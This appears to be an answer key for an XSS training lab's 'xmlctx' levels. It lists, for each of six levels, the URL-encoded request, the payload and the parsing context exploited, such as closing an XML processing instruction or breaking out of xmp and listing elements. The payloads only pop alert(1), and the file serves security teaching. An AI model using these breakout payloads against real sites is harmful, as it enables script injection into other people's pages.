# xmlctx — solutions

XML/XHTML-shaped pages served as text/html; deprecated container elements and PI.

### xmlctx-level1

`/xmlctx/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: XHTML doctype but served as text/html — raw HTML executes

### xmlctx-level2

`/xmlctx/level2/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: inside CDATA inside `<script>` — JS parser sees double-quoted string

### xmlctx-level3

`/xmlctx/level3/?query=%3Fxss%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `?xss><script>alert(1)</script>`
- context: query in `<?xml ... ?>` PI; close PI then inject HTML

### xmlctx-level4

`/xmlctx/level4/?query=%3C/xmp%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</xmp><svg onload=alert(1)>`
- context: break out of `<xmp>` (raw text) then inject

### xmlctx-level5

`/xmlctx/level5/?query=%3C/listing%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</listing><svg onload=alert(1)>`
- context: break out of `<listing>` (raw text) then inject

### xmlctx-level6

`/xmlctx/level6/?query=%3Csvg%20onload=alert(1)%3E`

- payload: `<svg onload=alert(1)>`
- context: query placed before `<plaintext>` — normal HTML parsing still active
